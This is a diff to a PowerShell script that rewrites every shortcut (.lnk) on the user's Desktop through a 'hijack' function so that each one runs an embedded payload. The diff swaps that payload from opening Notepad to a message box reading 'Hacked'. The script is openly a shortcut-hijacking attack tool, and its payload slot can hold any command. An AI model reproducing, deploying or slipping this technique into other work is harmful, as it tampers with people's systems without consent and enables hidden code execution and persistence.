@@ -1,4 +1,6 @@
-$code = "open notepad"
+$code = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"
+
+############################################################################################################################################################
 
 function Get-Shortcut {
   param(
@@ -74,4 +76,4 @@ if(Test-Path -Path "$Link" -PathType Leaf){Set-Shortcut -LinkPath "$Link" -IconL
 
 #-----------------------------------------------------------------------------------------------------------
 
-Get-ChildItem –Path "$Env:USERPROFILE\Desktop" -Filter *.lnk | Foreach-Object {$i = Get-Shortcut $_.FullName;hijack $_.FullName}
+Get-ChildItem –Path "$Env:USERPROFILE\Desktop" -Filter *.lnk |Foreach-Object {$i = Get-Shortcut $_.FullName;hijack $_.FullName}
